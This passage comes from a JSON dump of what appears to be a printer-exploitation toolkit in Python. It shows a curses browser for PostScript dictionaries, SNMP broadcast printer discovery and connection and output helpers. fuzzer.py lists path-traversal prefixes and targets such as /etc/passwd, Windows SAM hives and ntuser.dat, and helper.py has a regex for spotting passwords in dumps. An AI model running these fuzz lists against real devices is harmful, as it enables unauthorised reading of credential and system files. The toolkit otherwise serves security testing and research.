self.data)\n        return treedata\n\n    def populate(self, treedata, data):\n        try:\n            if self.mainform.filter_text.value:\n                filter = self.mainform.filter_text.value + 'type'\n            else:\n                filter = ''\n        except AttributeError:\n            filter = ''\n\n        if isinstance(data, dict):\n            for key, val in list(data.items()):\n                recursion = False\n                type = val['type']\n                perms = val['perms']\n                value = val['value']\n                if isinstance(value, dict):\n                    value, recursion = '', True\n                if isinstance(value, list):\n                    try:\n                        value = ' '.join((x['value'] for x in value))\n                    except:\n                        value, recursion = '', True\n\n                c = {'key': key,\n                     'value': value,\n                     'type': type,\n                     'perms': perms}\n                if not filter or type == filter or recursion:\n                    c1 = treedata.new_child(content=c)\n                    if recursion:\n                        self.populate(c1, val['value'])\n\n        if isinstance(data, list):\n            count = 0\n            for val in data:\n                count = count + 1\n                key = str(count)\n                recursion = False\n                type = val['type']\n                perms = val['perms']\n                value = val['value']\n                if isinstance(value, dict):\n                    value, recursion = '', True\n                if isinstance(value, list):\n                    try:\n                        value = ' '.join((x['value'] for x in value))\n                    except:\n                        value, recursion = '', True\n\n                c = {'key': key,\n                     'value': value,\n                     'type': type,\n                     'perms': perms}\n                if not filter or type == filter or recursion:\n                    c1 = treedata.new_child(content=c)\n                    if recursion:\n                        self.populate(c1, val['value'])\n\n\nclass MainForm(npyscreen.FormBaseNew):\n\n    def quit(self, *args):\n        exit()\n\n    def update_dict(self):\n        self.dict.values = self.parentApp.get_data()\n        self.dict.display()\n        self.dict.entry_widget.reset_cursor()\n        self.items.value = len(self.dict.values)\n\n    def update_perms(self, perms):\n        self.perms.values = ['read', 'write', 'execute']\n        self.perms.value = []\n        if 'r' in perms:\n            self.perms.value += [0]\n        if 'w' in perms:\n            self.perms.value += [1]\n        if 'x' in perms:\n            self.perms.value += [2]\n        self.perms.display()\n\n    def update_value(self, value, type, perms):\n        self.value.name = 'Edit Value (' + type + ')'\n        self.value.value = value\n        if 'w' in perms:\n            self.value.editable = True\n        else:\n            self.value.editable = False\n        self.value.display()\n\n    def adjust_widgets1(self):\n        self.dict.entry_widget._filter = self.searchline.value\n        filtered_lines = self.dict.entry_widget.get_filtered_indexes()\n        len_f = len(filtered_lines)\n        if not self.searchline.value:\n            self.statusline.value = ''\n        elif len_f == 0:\n            self.statusline.value = '(No Matches)'\n        elif len_f == 1:\n            self.statusline.value = '(1 Match)'\n        else:\n            self.statusline.value = '(%s Matches)' % len_f\n        self.statusline.display()\n\n    def search(self, *args):\n        self.dict._contained_widget.h_set_filter\n        self.dict.entry_widget.h_set_filter\n        window = SearchDropdown(name='by key/value')\n        self.searchline = window.add(\n            npyscreen.TitleText, name='Keyword:', value=self.search_text.value)\n        window.nextrely += 1\n        self.statusline = window.add(\n            npyscreen.Textfield, color='LABEL', editable=False)\n        window.adjust_widgets = self.adjust_widgets1\n        window.display()\n        self.searchline.edit()\n        self.dict.entry_widget._remake_filter_cache()\n        self.dict.entry_widget.jump_to_first_filtered()\n        self.search_btn.h_exit_down(ord('a'))\n        self.filter_btn.h_exit_down(ord('a'))\n        self.search_text.value = self.searchline.value\n        self.search_text.update()\n\n    def filter(self, *args):\n        window = FilterDropdown(name='by datatype')\n        select = window.add_widget(npyscreen.MultiLine, return_exit=True, select_exit=True, values=['name',\n                                                                                                    'string',\n                                                                                                    'boolean',\n                                                                                                    'integer',\n                                                                                                    'real',\n                                                                                                    'null',\n                                                                                                    'operator',\n                                                                                                    'dict',\n                                                                                                    'array',\n                                                                                                    'packedarray',\n                                                                                                    'file',\n                                                                                                    'font',\n                                                                                                    'gstate',\n                                                                                                    'mark',\n                                                                                                    'save'])\n        window.display()\n        select.edit()\n        if select.value:\n            self.filter_text.value = select.values[select.value]\n            self.filter_text.update()\n            self.update_dict()\n\n    def reset(self, *args):\n        self.filter_text.value = ''\n        self.search_text.value = ''\n        self.filter_text.update()\n        self.search_text.update()\n\n    def usage(self, *args):\n        message = '  < or >:     collapse/expand node\\n  { or }:     collapse/expand tree\\n  /:          set search filter\\n  f:          set datatype filter\\n  r:          reset all filters\\n  n:          move next filtered\\n  p:          move prev filtered\\n  q:          quit application'\n        npyscreen.notify_confirm(message, title='Usage Help')\n\n    def commit(self, *args):\n        pass\n\n    def create(self):\n        self.name = 'Dictionary Browser \\xe2\\x94\\x80\\xe2\\x94\\x80 (Press F1 for help)'\n        self.add_handlers({curses.KEY_F1: self.usage,\n                           ord('/'): self.search,\n                           ord('f'): self.filter,\n                           ord('r'): self.reset,\n                           ord('q'): self.quit})\n        self.items = self.add(npyscreen.TitleText,\n                              name='Items total', value='0', editable=False)\n        self.add(npyscreen.TitleText, name='PS version',\n                 value='3010', editable=False)\n        self.search_btn = self.add(\n            SearchButton, relx=33, rely=2, name='Search')\n        self.search_text = self.add(\n            npyscreen.FixedText, relx=53, rely=2, editable=False)\n        self.filter_btn = self.add(\n            FilterButton, relx=33, rely=3, name='Filter')\n        self.filter_text = self.add(\n            npyscreen.FixedText, relx=53, rely=3, editable=False)\n        self.dict = self.add(Dict, name='Dictionary', scroll_exit=True,\n                             max_width=43, relx=2, rely=5, max_height=-2)\n        self.perms = self.add(Perms, name='Permissions',\n                              scroll_exit=True, rely=5, relx=46, max_height=6)\n        self.value = self.add(Value, name='Edit Value',\n                              scroll_exit=True, rely=11, relx=46, max_height=-2)\n        self.status = self.add(npyscreen.TitleText, name='Status',\n                               editable=False, value='Connected to laserjet.lan', rely=-3)\n        self.save = self.add(npyscreen.ButtonPress,\n                             name='Save Changes', rely=-3, relx=-27)\n        self.exit = self.add(npyscreen.ButtonPress,\n                             name='Exit', rely=-3, relx=-12)\n        self.save.whenPressed = self.commit\n        self.exit.whenPressed = self.quit\n        self.update_dict()\n"
        },
        {
          "name": "db",
          "type": "tree",
          "content": null
        },
        {
          "name": "discovery.py",
          "type": "blob",
          "size": 5.31640625,
          "content": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\n# python standard library\nimport socket\n\n# local pret classes\nfrom helper import output, conv\n\n# third party modules\ntry:\n    from pysnmp.carrier.asyncore.dispatch import AsyncoreDispatcher\n    from pysnmp.carrier.asyncore.dgram import udp\n    from pysnmp.proto import api\n    from pyasn1.codec.ber import encoder, decoder\n    snmp_modules_found = True\nexcept ImportError:\n    snmp_modules_found = False\n\n########################################################\n### Most of this code comes from the PySNMP examples ###\n### and needs to be refactored into an 'snmp' class! ###\n########################################################\n\nstart = conv().now()  # get current time\ntimeout = 0.5         # be quick and dirty\nmaxhost = 999         # max printers to list\nresults = {}          # dict of found printers\n\ntry:\n    # use snmp v1 because it is most widely supported among printers\n    pmod = api.protoModules[api.protoVersion1]\n    pdu_send = pmod.GetRequestPDU()  # build protocol data unit (pdu)\nexcept:\n    pass\n\n# cause timeout interrupt\n\n\nclass stop_waiting(Exception):\n    pass\n\n# check for timeout\n\n\ndef timer(date):\n    if date - start > timeout:\n        raise stop_waiting()\n\n# noinspection PyUnusedLocal,PyUnusedLocal\n\n\ndef recv(dispatcher, domain, address, msg):\n    while msg:\n        msg_recv, msg = decoder.decode(msg, asn1Spec=pmod.Message())\n        pdu_recv = pmod.apiMessage.getPDU(msg_recv)\n        # match response to request as we're broadcasting\n        if pmod.apiPDU.getRequestID(pdu_send) == pmod.apiPDU.getRequestID(pdu_recv):\n            ipaddr = address[0]\n            device = '?'\n            uptime = '?'\n            status = '?'\n            prstat = 0\n            # retrieve device properties\n            for oid, val in pmod.apiPDU.getVarBinds(pdu_recv):\n                oid, val = oid.prettyPrint(), val.prettyPrint()\n                # skip non-printer devices\n                if oid == '1.3.6.1.2.1.25.3.2.1.2.1' and val != '1.3.6.1.2.1.25.3.1.5':\n                    return\n                # harvest device information\n                if oid == '1.3.6.1.2.1.25.3.2.1.3.1':\n                    device = val\n                if oid == '1.3.6.1.2.1.1.3.0':\n                    uptime = conv().elapsed(val, 100, True)\n                if oid == '1.3.6.1.2.1.43.16.5.1.2.1.1':\n                    status = val\n                if oid == '1.3.6.1.2.1.25.3.2.1.5.1' and val:\n                    prstat = val[:1]\n            dispatcher.jobFinished(1)\n            results[ipaddr] = [device, uptime, status, prstat]\n\n\nclass discovery():\n    # discover local network printers\n    def __init__(self, usage=False):\n        # abort if pysnmp is not installed\n        if not snmp_modules_found:\n            output().warning(\"Please install the 'pysnmp' module for SNMP support.\")\n            if usage:\n                print(\"\")\n            return\n        # skip when running 'discover' in interactive mode\n        if usage:\n            print(\"No target given, discovering local printers\")\n        oid = (('1.3.6.1.2.1.25.3.2.1.2.1',    None),  # HOST-RESOURCES-MIB → hrDeviceType\n               # HOST-RESOURCES-MIB → hrDeviceDescr\n               ('1.3.6.1.2.1.25.3.2.1.3.1',    None),\n               # HOST-RESOURCES-MIB → hrDeviceStatus\n               ('1.3.6.1.2.1.25.3.2.1.5.1',    None),\n               # Printer-MIB        → Printer status\n               ('1.3.6.1.2.1.43.16.5.1.2.1.1', None),\n               ('1.3.6.1.2.1.1.3.0',           None))  # SNMPv2-MIBv        → sysUpTime\n        try:\n            # build protocol data unit (pdu)\n            pmod.apiPDU.setDefaults(pdu_send)\n            pmod.apiPDU.setVarBinds(pdu_send, oid)\n            # build message\n            msg_send = pmod.Message()\n            pmod.apiMessage.setDefaults(msg_send)\n            pmod.apiMessage.setCommunity(msg_send, 'public')\n            pmod.apiMessage.setPDU(msg_send, pdu_send)\n            # ...\n            dispatcher = AsyncoreDispatcher()\n            dispatcher.registerRecvCbFun(recv)\n            dispatcher.registerTimerCbFun(timer)\n            # use ipv4 udp broadcast\n            udpSocketTransport = udp.UdpSocketTransport().openClientMode().enableBroadcast()\n            dispatcher.registerTransport(udp.domainName, udpSocketTransport)\n            # pass message to dispatcher\n            target = ('255.255.255.255', 161)\n            dispatcher.sendMessage(encoder.encode(\n                msg_send), udp.domainName, target)\n            # wait for timeout or max hosts\n            dispatcher.jobStarted(1, maxhost)\n            # dispatcher will finish as all jobs counter reaches zero\n            try:\n                dispatcher.runDispatcher()\n            except stop_waiting:\n                dispatcher.closeDispatcher()\n            # list found network printers\n            if results:\n                print(\"\")\n                output().discover(('address', ('device', 'uptime', 'status', None)))\n                output().hline(79)\n                for printer in sorted(list(results.items()), key=lambda item: socket.inet_aton(item[0])):\n                    output().discover(printer)\n            else:\n                output().info(\"No printers found via SNMP broadcast\")\n            if usage or results:\n                print(\"\")\n        except Exception as e:\n            output().errmsg(\"SNMP Error\", e)\n            if usage:\n                print(\"\")\n"
        },
        {
          "name": "fonts",
          "type": "tree",
          "content": null
        },
        {
          "name": "fuzzer.py",
          "type": "blob",
          "size": 1.302734375,
          "content": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nclass fuzzer():\n    vol = [\"\", \".\", \"\\\\\", \"/\", \"file:///\", \"C:/\", \"D:/\", \"E:/\", \"F:/\"]\n    var = [\"~\", \"$HOME\"]\n    win = [\"%WINDIR%\", \"%SYSTEMROOT%\", \"%HOMEPATH%\", \"%PROGRAMFILES%\"]\n    smb = [\"\\\\\\\\127.0.0.1\\\\\"]\n    web = [\"http://127.0.0.1/\"]  # \"http://hacking-printers.net/log.me\"\n    dir = [\"..\", \"...\", \"....\"]  # also combinations like \"./..\"\n# sep = [\"\", \"\\\\\", \"/\", \"\\\\\\\\\", \"//\", \"\\\\/\"]\n    fhs = [\"/etc\", \"/bin\", \"/sbin\", \"/home\", \"/proc\", \"/dev\", \"/lib\",\n           \"/opt\", \"/run\",  \"/sys\", \"/tmp\", \"/usr\", \"/var\",  \"/mnt\",]\n    abs = [\".profile\", [\"etc\", \"passwd\"], [\"bin\", \"sh\"], [\"bin\", \"ls\"],\n           \"boot.ini\", [\"windows\", \"win.ini\"], [\"windows\", \"cmd.exe\"]]\n    rel = [\"%WINDIR%\\\\win.ini\",\n           \"%WINDIR%\\\\repair\\\\sam\",\n           \"%WINDIR%\\\\repair\\\\system\",\n           \"%WINDIR%\\\\system32\\\\config\\\\system.sav\",\n           \"%WINDIR%\\\\System32\\\\drivers\\\\etc\\\\hosts\",\n           \"%SYSTEMDRIVE%\\\\boot.ini\",\n           \"%USERPROFILE%\\\\ntuser.dat\",\n           \"%SYSTEMDRIVE%\\\\pagefile.sys\",\n           \"%SYSTEMROOT%\\\\repair\\\\sam\",\n           \"%SYSTEMROOT%\\\\repair\\\\system\"]\n\n    # define prefixes to use in fuzzing modes\n    path = vol+var+win+smb+web  # path fuzzing\n    write = vol+var+win+smb+fhs  # write fuzzing\n    blind = vol+var             # blind fuzzing\n"
        },
        {
          "name": "helper.py",
          "type": "blob",
          "size": 23.5693359375,
          "content": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nfrom __future__ import print_function\n\n# python standard library\nfrom socket import socket\nimport sys\nimport os\nimport re\nimport stat\nimport math\nimport time\nimport datetime\nimport importlib\nimport traceback\n\n# third party modules\ntry:  # unicode monkeypatch for windoze\n    import win_unicode_console\n    win_unicode_console.enable()\nexcept:\n    msg = \"Please install the 'win_unicode_console' module.\"\n    if os.name == 'nt':\n        print(msg)\n\ntry:  # os independent color support\n    from colorama import init, Fore, Back, Style\n    init()  # required to get colors on windoze\nexcept ImportError:\n    msg = \"Please install the 'colorama' module for color support.\"\n    # poor man's colored output (ANSI)\n\n    class Back():\n        BLUE = '\\x1b[44m' if os.name == 'posix' else ''\n        CYAN = '\\x1b[46m' if os.name == 'posix' else ''\n        GREEN = '\\x1b[42m' if os.name == 'posix' else ''\n        MAGENTA = '\\x1b[45m' if os.name == 'posix' else ''\n        RED = '\\x1b[41m' if os.name == 'posix' else ''\n\n    class Fore():\n        BLUE = '\\x1b[34m' if os.name == 'posix' else ''\n        CYAN = '\\x1b[36m' if os.name == 'posix' else ''\n        MAGENTA = '\\x1b[35m' if os.name == 'posix' else ''\n        YELLOW = '\\x1b[33m' if os.name == 'posix' else ''\n\n    class Style():\n        DIM = '\\x1b[2m' if os.name == 'posix' else ''\n        BRIGHT = '\\x1b[1m' if os.name == 'posix' else ''\n        RESET_ALL = '\\x1b[0m' if os.name == 'posix' else ''\n        NORMAL = '\\x1b[22m' if os.name == 'posix' else ''\n    print(Back.RED + msg + Style.RESET_ALL)\n\n# ----------------------------------------------------------------------\n\n# return first item of list or alternative\n\n\ndef item(mylist, alternative=\"\"):\n    return next(iter(mylist), alternative)\n\n# split list into chunks of equal size\n\n\ndef chunks(l, n):\n    for i in range(0, len(l), n):\n        yield l[i:i+n]\n\n# ----------------------------------------------------------------------\n\n\nclass log():\n    # open logfile\n    def open(self, filename):\n        try:\n            return open(filename, mode='wb')\n        except IOError as e:\n            output().errmsg(\"Cannot open logfile\", e)\n            return None\n\n    # write raw data to logfile\n    def write(self, logfile, data):\n        # logfile open and data non-empty\n        if logfile and data:\n            try:\n                logfile.write(data)\n            except IOError as e:\n                output().errmsg(\"Cannot log\", e)\n\n    # write comment to logfile\n    def comment(self, logfile, line):\n        comment = \"%\" + (\"[ \" + line + \" ]\").center(72, '-')\n        self.write(logfile, os.linesep + comment + os.linesep)\n\n    # close logfile\n    def close(self, logfile):\n        try:\n            logfile.close()\n        except IOError as e:\n            output().errmsg(\"Cannot close logfile\", e)\n\n# ----------------------------------------------------------------------\n\n\nclass output():\n    # show send commands (debug mode)\n    def send(self, str, mode):\n        if str:\n            print(Back.CYAN + str + Style.RESET_ALL)\n        if str and mode == 'hex':\n            print(Fore.CYAN + conv().hex(str, ':') + Style.RESET_ALL)\n\n    # show recv commands (debug mode)\n    def recv(self, str, mode):\n        if str:\n            print(Back.MAGENTA + str + Style.RESET_ALL)\n        if str and mode == 'hex':\n            print(Fore.MAGENTA + conv().hex(str, ':') + Style.RESET_ALL)\n\n    # show information\n    def info(self, msg, eol=None):\n        if msg:\n            print(Back.BLUE + msg + Style.RESET_ALL, end=eol)\n        sys.stdout.flush()\n\n    # show raw data\n    def raw(self, msg, eol=None):\n        if msg:\n            print(Fore.YELLOW + msg + Style.RESET_ALL, end=eol)\n        sys.stdout.flush()\n\n    # show chit-chat\n    def chitchat(self, msg, eol=None):\n        if msg:\n            print(Style.DIM + msg + Style.RESET_ALL, end=eol)\n        sys.stdout.flush()\n\n    # show warning message\n    def warning(self, msg):\n        if msg:\n            print(Back.RED + msg + Style.RESET_ALL)\n\n    # show green message\n    def green(self, msg):\n        if msg:\n            print(Back.GREEN + msg + Style.RESET_ALL)\n\n    # show error message\n    def errmsg(self, msg, info=\"\"):\n        info = str(info).strip()\n        if info:  # monkeypatch to make python error message less ugly\n            info = item(re.findall('Errno -?\\d+\\] (.*)', info),\n                        '') or info.splitlines()[-1]\n            info = Style.RESET_ALL + Style.DIM + \\\n                \" (\" + info.strip('<>') + \")\" + Style.RESET_ALL\n        if msg:\n            print(Back.RED + msg + info)\n\n    # show printer and status\n    def discover(self, xxx_todo_changeme):\n        (ipaddr, (device, uptime, status, prstat)) = xxx_todo_changeme\n        ipaddr = output().strfit(ipaddr, 15)\n        device = output().strfit(device, 27)\n        uptime = output().strfit(uptime,  8)\n        status = output().strfit(status, 23)\n        if device.strip() != 'device':\n            device = Style.BRIGHT + device + Style.NORMAL\n        if prstat == '1':\n            status = Back.GREEN + status + Back.BLUE  # unknown\n        if prstat == '2':\n            status = Back.GREEN + status + Back.BLUE  # running\n        if prstat == '3':\n            status = Back.YELLOW + status + Back.BLUE  # warning\n        if prstat == '4':\n            status = Back.GREEN + status + Back.BLUE  # testing\n        if prstat == '5':\n            status = Back.RED + status + Back.BLUE  # down\n        line = (ipaddr, device, uptime, status)\n        output().info('%-15s  %-27s  %-8s  %-23s' % line)\n\n    # recursively list files\n    def psfind(self, name):\n        vol = Style.DIM + Fore.YELLOW + \\\n            item(re.findall(\"^(%.*%)\", name)) + Style.RESET_ALL\n        name = Fore.YELLOW + const.SEP + \\\n            re.sub(\"^(%.*%)\", '', name) + Style.RESET_ALL\n        print(\"%s %s\" % (vol, name))\n\n    # show directory listing\n    def psdir(self, isdir, size, mtime, name, otime):\n        otime = Style.DIM + \"(created \" + otime + \")\" + Style.RESET_ALL\n        vol = Style.DIM + Fore.YELLOW + \\\n            item(re.findall(\"^(%.*%)\", name)) + Style.RESET_ALL\n        # remove volume information from filename\n        name = re.sub(\"^(%.*%)\", '', name)\n        name = Style.BRIGHT + Fore.BLUE + name + Style.RESET_ALL if isdir else name\n        if isdir:\n            print(\"d %8s   %s %s %s %s\" % (size, mtime, otime, vol, name))\n        else:\n            print(\"- %8s   %s %s %s %s\" % (size, mtime, otime, vol, name))\n\n    # show directory listing\n    def pjldir(self, name, size):\n        name = name if size else Style.BRIGHT + Fore.BLUE + name + Style.RESET_ALL\n        if size:\n            print(\"- %8s   %s\" % (size, name))\n        else:\n            print(\"d %8s   %s\" % (\"-\", name))\n\n    # show directory listing\n    def pcldir(self, size, mtime, id, name):\n        id = Style.DIM + \"(macro id: \" + id + \")\" + Style.RESET_ALL\n        print(\"- %8s   %s %s %s\" % (size, mtime, id, name))\n\n    # show output from df\n    def df(self, args):\n        self.info(\"%-16s %-11s %-11s %-9s %-10s %-8s %-9s %-10s %-10s\" % args)\n\n    # show fuzzing results\n    def fuzzed(self, path, cmd, opt):\n        opt1, opt2, opt3 = opt\n        if isinstance(opt1, bool):\n            opt1 = (Back.GREEN + str(opt1) + Back.BLUE + \"   \")\\\n                if opt1 else (Back.RED + str(opt1) + Back.BLUE + \"  \")\n        if isinstance(opt2, bool):\n            opt2 = (Back.GREEN + str(opt2) + Back.BLUE + \"   \")\\\n                if opt2 else (Back.RED + str(opt2) + Back.BLUE + \"  \")\n        if isinstance(opt3, bool):\n            opt3 = (Back.GREEN + str(opt3) + Back.BLUE + \"   \")\\\n                if opt3 else (Back.RED + str(opt3) + Back.BLUE + \"  \")\n        opt = opt1, opt2, opt3\n        self.info(\"%-35s %-12s %-7s %-7s %-7s\" % ((path, cmd) + opt))\n\n    # show captured jobs\n    def joblist(self, xxx_todo_changeme1):\n        (date, size, user, name, soft) = xxx_todo_changeme1\n        user = output().strfit(user, 13)\n        name = output().strfit(name, 22)\n        soft = output().strfit(soft, 20)\n        line = (date, size, user, name, soft)\n        output().info('%-12s %5s  %-13s  %-22s  %-20s' % line)\n\n    # show ascii only\n    def ascii(self, data):\n        data = re.sub(r\"(\\x00){10}\", \"\\x00\", data)  # shorten nullbyte streams\n        data = re.sub(r\"([^ -~])\", \".\", data)  # replace non-printable chars\n        self.raw(data, \"\")\n\n    # show binary dump\n    def dump(self, data):\n        # experimental regex to match sensitive strings like passwords\n        data = re.sub(\n            r\"[\\x00-\\x06,\\x1e]([!-~]{6,}?(?!\\\\0A))\\x00{16}\", \"START\" + r\"\\1\" + \"STOP\", data)\n        data = re.sub(r\"\\00+\", \"\\x00\", data)  # ignore nullbyte streams\n        data = re.sub(r\"(\\x00){10}\", \"\\x00\", data)  # ignore nullbyte streams\n        data = re.sub(r\"([\\x00-\\x1f,\\x7f-\\xff])\", \".\", data)\n        data = re.sub(r\"START([!-~]{6,}?)STOP\", Style.RESET_ALL +\n                      Back.BLUE + r\"\\1\" + Style.RESET_ALL + Fore.YELLOW, data)\n        self.raw(data, \"\")\n\n    # dump ps dictionary\n    def psdict(self, data, indent=''):\n        importlib.reload(sys)  # workaround for non-ascii output\n        # sys.setdefaultencoding('UTF8')\n        # convert list to dictionary with indices as keys\n        if isinstance(data, list):\n            data = dict(enumerate(data))\n        # data now is expected to be a dictionary\n        if len(list(data.keys())) > 0:\n            last = sorted(data.keys())[-1]\n        for key, val in sorted(data.items()):\n            type = val['type'].replace('type', '')\n            value = val['value']\n            perms = val['perms']\n            recursion = False\n            # current entry is a dictionary\n            if isinstance(value, dict):\n                value, recursion = '', True\n            # current entry is a ps array\n            if isinstance(value, list):\n                try:  # array contains only atomic values\n                    value = ' '.join(x['value'] for x in value)\n                except:  # array contains further list or dict\n                    # value = sum(val['value'], [])\n                    value, recursion = '', True\n            # value = value.encode('ascii', errors='ignore')\n            node = '┬' if recursion else '─'\n            edge = indent + ('└' if key == last else '├')\n            # output current node in dictionary\n            print(\"%s%s %-3s  %-11s  %-30s  %s\" %\n                  (edge, node, perms, type, key, value))\n            if recursion:  # ...\n                self.psdict(val['value'], indent +\n                            (' ' if key == last else '│'))\n\n    # show some information\n    def psonly(self):\n        self.chitchat(\n            \"Info: This only affects jobs printed by a PostScript driver\")\n\n    # countdown from sec to zero\n    def countdown(self, msg, sec, cmd):\n        try:\n            sys.stdout.write(msg)\n            for x in reversed(list(range(1, sec+1))):\n                sys.stdout.write(\" \" + str(x))\n                sys.stdout.flush()\n                time.sleep(1)\n            print(\" KABOOM!\")\n            return True\n        except KeyboardInterrupt:\n            print(\"\")\n\n    # show horizontal line\n    def hline(self, len=72):\n        self.info(\"─\" * len)\n\n    # crop/pad string to fixed length\n    def strfit(self, str, max):\n        str = str.strip() or \"-\"\n        if str.startswith('(') and str.endswith(')'):\n            str = str[1:-1]\n        # crop long strings\n        if len(str) > max:\n            str = str[0:max-1] + \"…\"\n        # pad short strings\n        return str.ljust(max)\n\n# ----------------------------------------------------------------------\n\n\nclass conv():\n    # return current time\n    def now(self):\n        return int(time.time())\n\n    # return time elapsed since unix epoch\n    def elapsed(self, date, div=1, short=False):\n        date = str(datetime.timedelta(seconds=int(date)/div))\n        return date.split(\",\")[0] if short else date\n\n    # return date dependent on current year\n    def lsdate(self, date):\n        year1 = datetime.datetime.now().year\n        year2 = datetime.datetime.fromtimestamp(date).year\n        pdate = '%b %e ' if os.name == 'posix' else '%b %d '\n        format = pdate + \"%H:%M\" if year1 == year2 else pdate + \" %Y\"\n        return time.strftime(format, time.localtime(date))\n\n    # return date plus/minus given seconds\n    def timediff(self, seconds):\n        return self.lsdate(self.now() + self.int(seconds) / 1000)\n\n    # convert size to human readable value\n    def filesize(self, num):\n        num = self.int(num)\n        for unit in ['B', 'K', 'M']:\n            if abs(num) < 1024.0:\n                return ((\"%4.1f%s\" if unit == 'M' else \"%4.0f%s\") % (num, unit))\n            num /= 1024.0\n\n    # remove carriage return from line breaks\n    def nstrip(self, data):\n        return re.sub(r'\\r\\n', '\\n', data)\n\n    # convert string to hexadecimal\n    def hex(self, data, sep=''):\n        return sep.join(\"{:02x}\".format(ord(c)) for c in data)\n\n    # convert to ascii character\n    def chr(self, num):\n        return chr(self.int(num))\n\n    # convert to integer or zero\n    def int(self, num):\n        try:\n            n = int(num)\n        except ValueError:\n            n = 0\n        return n\n\n# ----------------------------------------------------------------------\n\n\nclass file():\n    # read from local file\n    def read(self, path):\n        try:\n            with open(path, mode='rb') as f:\n                data = f.read()\n            f.close()\n            return data\n        except IOError as e:\n            output().errmsg(\"Cannot read from file\", e)\n\n    # write to local file\n    def write(self, path, data, m='wb'):\n        try:\n            with open(path, mode=m) as f:\n                f.write(data)\n            f.close()\n        except IOError as e:\n            output().errmsg(\"Cannot write to file\", e)\n\n    # append to local file\n    def append(self, path, data):\n        self.write(path, data, 'ab+')\n\n# ----------------------------------------------------------------------\n\n\nclass conn(object):\n    # create debug connection object\n    def __init__(self, mode, debug, quiet):\n        self.mode = mode\n        self.debug = debug\n        self.quiet = quiet\n        self._file = None\n        self._sock = socket()\n\n    # open connection\n    def open(self, target, port=9100):\n        # target is a character device\n        if os.path.exists(target) \\\n                and stat.S_ISCHR(os.stat(target).st_mode):\n            self._file = os.open(target, os.O_RDWR)\n        # treat target as ipv4 socket\n        else:\n            m = re.search('^(.+?):([0-9]+)$', target)\n            if m:\n                [target, port] = m.groups()\n                port = int(port)\n\n            self._sock.connect((target, port))\n\n    # close connection\n    def close(self, *arg):\n        # close file descriptor\n        if self._file:\n            os.close(self._file)\n        # close inet socket\n        else:\n            self._sock.close()\n\n    # set timeout\n    def timeout(self, *arg):\n        self._sock.settimeout(*arg)\n\n    # send data\n    def send(self, data):\n        if self.debug:\n            output().send(self.beautify(data), self.debug)\n        # send data to device\n        if self._file:\n            return os.write(self._file, data)\n        # send data to socket\n        elif self._sock:\n            if not isinstance(data, bytes):\n                data = data.encode()\n            try:\n                return self._sock.sendall(data)\n            except:\n                print(traceback.print_exc())\n\n    # receive data\n    def recv(self, bytes):\n        # receive data from device\n        if self._file:\n            data = os.read(self._file, bytes).decode()\n        # receive data from socket\n        else:\n            data = self._sock.recv(bytes).decode()\n        # output recv data when in debug mode\n        if self.debug:\n            output().recv(self.beautify(data), self.debug)\n        return data\n\n    # so-many-seconds-passed bool condition\n    def past(self, seconds, watchdog):\n        return int(watchdog * 100) % (seconds * 100) == 0\n\n    # connection-feels-slow bool condition\n    def slow(self, limit, watchdog):\n        return not (self.quiet or self.debug) and watchdog > limit\n\n    # receive data until a delimiter is reached\n    def recv_until(self, delimiter, fb=True, crop=True, binary=False):\n        data = \"\"\n        sleep = 0.01  # pause in recv loop\n        limit = 3.0  # max watchdog overrun\n        wd = 0.0  # watchdog timeout counter\n        r = re.compile(delimiter, re.DOTALL)\n        s = re.compile(\"^\\x04?\\x0d?\\x0a?\" + delimiter, re.DOTALL)\n        # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n        while not r.search(data):\n            data += self.recv(4096)  # receive actual data\n            if self.past(limit, wd):\n                wd_old, bytes = wd, len(data)\n            wd += sleep       # workaround for endless loop w/o socket timeout\n            time.sleep(sleep)  # happens on some devices - python socket error?\n            # timeout plus it seems we are not receiving data anymore\n            if wd > self._sock.gettimeout() and wd >= wd_old + limit:\n                if len(data) == bytes:\n                    output().errmsg(\"Receiving data failed\", \"watchdog timeout\")\n                    break\n            # visual feedback on large/slow data transfers\n            if self.slow(limit, wd) and self.past(0.1, wd) and len(data) > 0:\n                output().chitchat(str(len(data)) + \" bytes received\\r\", '')\n        # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n        # clear current line from 'so-many bytes received' chit-chat\n        if self.slow(limit, wd):\n            output().chitchat(' ' * 24 + \"\\r\", '')\n        # warn if feedback expected but response empty (= delimiter only)\n        # this also happens for data received out of order (e.g. brother)\n        if fb and s.search(data):\n            output().chitchat(\"No data received.\")\n        # remove delimiter itself from data\n        if crop:\n            data = r.sub('', data)\n        # crop uel sequence at the beginning\n        data = re.sub(r'(^' + const.UEL + ')', '', data)\n        '''\n    ┌─────────────────────────────────────────────────────────────────────────┐\n    │ delimiters -- note that carriage return (0d) is optional in ps/pjl      │\n    ├─────────────────────────┬─────────────────────────┬─────────────────────┤\n    │                         │           PJL           │      PostScript     │\n    ├─────────────────────────┼─────────┬───────────────┼────────┬────────────┤\n    │                         │ send    │ recv          │ send   │ recv       │\n    ├─────────────────────────┼─────────┼───────────────┼────────┼────────────┤\n    │ normal commands (ascii) │ 0d? 0a  │ 0d+ 0a 0c 04? │ 0d? 0a │ 0d? 0a 04? │\n    ├─────────────────────────┼─────────┼───────────────┼────────┼────────────┤\n    │ file transfers (binary) │ 0d? 0a  │ 0c            │ 0d? 0a │ -          │\n    └─────────────────────────┴─────────┴───────────────┴────────┴────────────┘\n    '''\n        # crop end-of-transmission chars\n        if self.mode == 'ps':\n            data = re.sub(r'^\\x04', '', data)\n            if not binary:\n                data = re.sub(r'\\x0d?\\x0a\\x04?$', '', data)\n        else:  # pjl and pcl mode\n            if binary:\n                data = re.sub(r'\\x0c$', '', data)\n            else:\n                data = re.sub(r'\\x0d+\\x0a\\x0c\\x04?$', '', data)\n        # crop whitespaces/newline as feedback\n        if not binary:\n            data = data.strip()\n        return data\n\n    # beautify debug output\n    def beautify(self, data):\n        # remove sent/recv uel sequences\n        \"\"\"if isinstance(data, bytes):\n          try:\n            data = data.decode()\n          except UnicodeDecodeError:\n            data = \"[PDF bytes]\"\"\"\n        data = re.sub(r'' + const.UEL, '', str(data))\n        # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n        if self.mode == 'ps':\n            # remove sent postscript header\n            data = re.sub(r'' + re.escape(const.PS_HEADER), '', data)\n            # remove sent 